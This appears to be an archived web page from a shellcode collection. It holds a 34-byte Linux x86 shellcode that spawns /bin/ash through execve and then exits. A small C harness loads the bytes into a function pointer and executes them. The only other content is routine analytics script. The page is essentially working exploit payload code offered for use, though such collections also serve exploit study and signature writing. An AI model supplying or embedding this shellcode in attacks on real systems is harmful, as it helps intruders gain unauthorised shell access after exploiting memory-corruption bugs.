<html><head><title>Linux/x86 - execve()/bin/ash; exit; - 34 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
 * Linux x86 shellcode by bob from Dtors.net.
 * execve()/bin/ash; exit; 
 * Total = 34 bytes.
 */



#include &lt;stdio.h&gt;

char shellcode[]=
		&quot;\x31\xc0\x50\x68\x2f\x61\x73\x68\x68&quot;
		&quot;\x2f\x62\x69\x6e\x89\xe3\x8d\x54\x24&quot;
		&quot;\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd&quot;
		&quot;\x80\x31\xc0\xb0\x01\xcd\x80&quot;;
int
main()
{
        void (*dsr) ();
        (long) dsr = &amp;shellcode;
        printf(&quot;Size: %d bytes.\n&quot;, sizeof(shellcode)); 
        dsr();
}


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
